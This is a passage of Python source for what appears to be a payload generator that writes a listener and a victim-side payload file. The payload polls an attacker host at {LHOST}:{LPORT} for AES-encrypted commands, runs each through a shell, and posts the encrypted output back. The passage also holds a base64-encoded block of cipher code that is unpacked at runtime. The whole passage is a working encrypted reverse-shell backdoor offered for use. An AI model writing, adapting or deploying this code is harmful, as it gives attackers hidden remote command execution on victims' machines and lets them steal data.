CBoZXhfYXJyYXlbaV0pCiAgICAgICAgICAgIGNpcGhlcl9hcnJheS5hcHBlbmQoc2VsZi5ibG9ja19jaXBoZXJfYWxnLmNpcGhlcihibG9ja190b19jaXBoZXIpKQogICAgICAgICAgICBpdiA9IGNpcGhlcl9hcnJheVtpICsgMV0KCiAgICAgICAgRmlsZVRvb2xzLndyaXRlX2ZpbGUoZW5jcnlwdGVkX2ZpbGVfbmFtZSwgY2lwaGVyX2FycmF5KQoKICAgIGRlZiBkZWNpcGhlcihzZWxmLCBmaWxlbmFtZSwgZGVjcnlwdGVkX2ZpbGVfbmFtZSk6CgogICAgICAgIGhleF9hcnJheSA9IEZpbGVUb29scy5vcGVuX2ZpbGUoZmlsZW5hbWUsIDMyKQogICAgICAgIGl2ID0gaGV4X2FycmF5WzBdCiAgICAgICAgZGVjcnlwdGVkX2FycmF5ID0gW10KICAgICAgICBmb3IgaSBpbiB0cWRtKHJhbmdlKDEsIGxlbihoZXhfYXJyYXkpKSwgZGVzYz0iQ0JDIGRlY3J5cHRpb24iKToKICAgICAgICAgICAgZGVjcnlwdGVkX2FycmF5LmFwcGVuZChzZWxmLmJsb2NrX2NpcGhlcl9hbGcuZGVjaXBoZXIoaGV4X2FycmF5W2ldKSkKICAgICAgICAgICAgZGVjcnlwdGVkX2FycmF5W2kgLSAxXSA9IHhvcl9ibG9ja3MoaXYsIGRlY3J5cHRlZF9hcnJheVtpIC0gMV0pCgogICAgICAgICAgICBpdiA9IGhleF9hcnJheVtpXQoKICAgICAgICBkZWNyeXB0ZWRfYXJyYXlbLTFdID0gdW5wYWQoZGVjcnlwdGVkX2FycmF5Wy0xXSkKCiAgICAgICAgRmlsZVRvb2xzLndyaXRlX2ZpbGUoZGVjcnlwdGVkX2ZpbGVfbmFtZSwgZGVjcnlwdGVkX2FycmF5KQoKY2xhc3MgQ1RSOgoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBibG9ja19jaXBoZXJfYWxnKToKICAgICAgICBzZWxmLmJsb2NrX2NpcGhlcl9hbGcgPSBibG9ja19jaXBoZXJfYWxnCiAgICAgICAgc2VsZi5jdHIgPSBnZW5lcmF0ZV9yYW5kb21fY3RyKCkKCiAgICBkZWYgY2lwaGVyKHNlbGYsIGZpbGVuYW1lLCBlbmNyeXB0ZWRfZmlsZV9uYW1lKToKCiAgICAgICAgaGV4X2FycmF5ID0gRmlsZVRvb2xzLm9wZW5fZmlsZShmaWxlbmFtZSwgMzIpCgogICAgICAgIGNpcGhlcl9hcnJheSA9IFtzZWxmLmN0cl0KCiAgICAgICAgY3RyID0gc2VsZi5jdHIKICAgICAgICBmb3IgaSBpbiB0cWRtKHJhbmdlKGxlbihoZXhfYXJyYXkpKSwgZGVzYz0iQ1RSIGVuY3J5cHRpb24iKToKICAgICAgICAgICAgY3RyX2VuY3J5cHRlZCA9IHNlbGYuYmxvY2tfY2lwaGVyX2FsZy5jaXBoZXIoY3RyKQogICAgICAgICAgICBjaXBoZXJfYXJyYXkuYXBwZW5kKHhvcl9ibG9ja3MoY3RyX2VuY3J5cHRlZCwgaGV4X2FycmF5W2ldKSkKICAgICAgICAgICAgY3RyID0gaW5jcmVtZW50X2N0cihjdHIpCgogICAgICAgIEZpbGVUb29scy53cml0ZV9maWxlKGVuY3J5cHRlZF9maWxlX25hbWUsIGNpcGhlcl9hcnJheSkKCiAgICAgICAgCiAgICBkZWYgZGVjaXBoZXIoc2VsZiwgZmlsZW5hbWUsIGRlY3J5cHRlZF9maWxlX25hbWUpOgoKICAgICAgICBoZXhfYXJyYXkgPSBGaWxlVG9vbHMub3Blbl9maWxlKGZpbGVuYW1lLCAzMikKICAgICAgICBjdHIgPSBoZXhfYXJyYXlbMF0KICAgICAgICBkZWNyeXB0ZWRfYXJyYXkgPSBbXQogICAgICAgIGZvciBpIGluIHRxZG0ocmFuZ2UoMSwgbGVuKGhleF9hcnJheSkpLCBkZXNjPSJDVFIgZGVjcnlwdGlvbiIpOgogICAgICAgICAgICBjdHJfZW5jcnlwdGVkID0gc2VsZi5ibG9ja19jaXBoZXJfYWxnLmNpcGhlcihjdHIpCiAgICAgICAgICAgIGRlY3J5cHRlZF9hcnJheS5hcHBlbmQoeG9yX2Jsb2NrcyhjdHJfZW5jcnlwdGVkLCBoZXhfYXJyYXlbaV0pKQogICAgICAgICAgICBjdHIgPSBpbmNyZW1lbnRfY3RyKGN0cikKCiAgICAgICAgRmlsZVRvb2xzLndyaXRlX2ZpbGUoZGVjcnlwdGVkX2ZpbGVfbmFtZSwgZGVjcnlwdGVkX2FycmF5KQoKY2xhc3MgRmlsZVRvb2xzOgoKICAgIEBzdGF0aWNtZXRob2QKICAgIGRlZiBvcGVuX2ZpbGUoZmlsZW5hbWUsIGNodW5rX3NpemUpOgoKICAgICAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICJyYiIpIGFzIGY6CiAgICAgICAgICAgIGhleF9hcnJheSA9IFtdCiAgICAgICAgICAgIGZvciBvZmZzZXQgaW4gcmFuZ2UoMCwgb3MucGF0aC5nZXRzaXplKGZpbGVuYW1lKSwgMTYpOgogICAgICAgICAgICAgICAgaGV4X2FycmF5LmFwcGVuZChieXRlcy5oZXgoZi5yZWFkKDE2KSkpCiAgICAgICAgICAgICAgICBmLnNlZWsob2Zmc2V0ICsgMTYpCgogICAgICAgICAgICBmLmNsb3NlKCkKICAgICAgICAKICAgICAgICByZXR1cm4gaGV4X2FycmF5CgogICAgQHN0YXRpY21ldGhvZAogICAgZGVmIHdyaXRlX2ZpbGUoZmlsZW5hbWUsIGJsb2NrX2FycmF5KToKCiAgICAgICAgd2l0aCBvcGVuKGZpbGVuYW1lLCAiYWIiKSBhcyBmOgogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oYmxvY2tfYXJyYXkpKToKICAgICAgICAgICAgICAgIGYud3JpdGUoYnl0ZXMuZnJvbWhleChibG9ja19hcnJheVtpXSkpCgogICAgICAgICAgICBmLmNsb3NlKCk='))")
create_folder_with_files("aes")
sys.path.append("aes")
from aes import AES

def pad(s):
    return s + (32 - len(s) % 32) * chr(32 - len(s) % 32)

def encrypt(message, key):
    padded_message = pad(message).encode().hex()
    aes = AES(key)
    encrypted_message = aes.cipher(padded_message)
    return str(encrypted_message)

def decrypt(encrypted_message, key):
    aes = AES(key)
    decrypted_message_hex = aes.decipher(encrypted_message)
    decrypted_message = bytes.fromhex(decrypted_message_hex).decode().rstrip(chr(0))
    return decrypted_message

# Custom key
key = "{key}"

while True:
    try:
        get_raw_cmd = requests.get('http://{LHOST}:{LPORT}')
        raw_cmd = get_raw_cmd.text
        print(raw_cmd)
        decrypted_cmd = decrypt(raw_cmd, key)
        string_form = str(decrypted_cmd)
        print(string_form)
        if 'Closed' in string_form:
            break
        else:
            # Execute the command and capture the output
            def remove_unreadable_chars(input_string):
                return ''.join(char for char in input_string if char.isprintable())

            # Example string with unreadable characters
            input_string = string_form

            # Remove unreadable characters
            cleaned_string = remove_unreadable_chars(input_string)
            output = subprocess.check_output(cleaned_string, shell = True)
            Data = output.decode('utf-8')
            print(output)
            encrypted_msg = encrypt(Data, key)
            post_output = requests.post(url='http://{LHOST}:{LPORT}', data=encrypted_msg)
    except Exception as e:
        print("Error:", e)        
'''
filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 3))

with open(f"Listener_{filename}.py","a") as file:
        file.write(Listener)        
print(f"\n[-] 'Listener_{filename}.py' is generated")

with open(f"Payload_{filename}.py","a") as file:
        file.write(Payload)
print(f"\n[-] 'Payload_{filename}.py' is generated\n")

Listening_optional = str(input("[+] Wanna active listening mode now ? (y/n): "))

try:
    if Listening_optional == "yes" or Listening_optional == "Yes" or Listening_optional == "Y" or Listening_optional == "y": 
        subprocess.call(f"python3 Listener_{filename}.py", shell = True)
    else:
        print("\n[-] Closed!\n")     
except KeyboardInterrupt:
    print('[-] Terminated!\n')
